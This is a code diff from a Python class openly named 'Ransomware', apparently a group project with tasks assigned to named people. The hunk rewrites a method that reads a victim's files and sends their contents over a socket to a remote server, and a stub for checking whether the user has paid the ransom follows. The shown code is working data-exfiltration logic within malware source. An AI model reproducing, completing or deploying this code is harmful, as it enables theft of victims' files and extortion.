@@ -57,27 +57,23 @@ class Ransomware:
 
     #TODO Rafi/Yusef:
     def send_file_to_server(self, file_path):
-        dir_list = self.list_safe_directories(file_path)
-        for dir in dir_list:
-            for file in self.get_files_in_dir(dir):
-                file_path = os.path.join(dir, file)
             
-                """ Opening and reading the file data. """
-                file = open(file_path, "r")
-                data = file.read()
- 
-                """ Sending the filename to the server. """
-                self._socket.send("malware.py".encode("utf-8"))
-                msg = self._socket.recv(1024).decode("utf-8")
-                print(f"[SERVER]: {msg}")
- 
-                """ Sending the file data to the server. """
-                self._socket.send(data.encode("utf-8"))
-                msg = self._socket.recv(1024).decode("utf-8")
-                print(f"[SERVER]: {msg}")
-                
-                """ Closing the file. """
-                file.close()
+        """ Opening and reading the file data. """
+        file = open(file_path, "r")
+        data = file.read()
+
+        """ Sending the filename to the server. """
+        self._socket.send("malware.py".encode("utf-8"))
+        msg = self._socket.recv(1024).decode("utf-8")
+        print(f"[SERVER]: {msg}")
+
+        """ Sending the file data to the server. """
+        self._socket.send(data.encode("utf-8"))
+        msg = self._socket.recv(1024).decode("utf-8")
+        print(f"[SERVER]: {msg}")
+        
+        """ Closing the file. """
+        file.close()
 
     #TODO Subin:
     def check_if_user_has_paid(self):
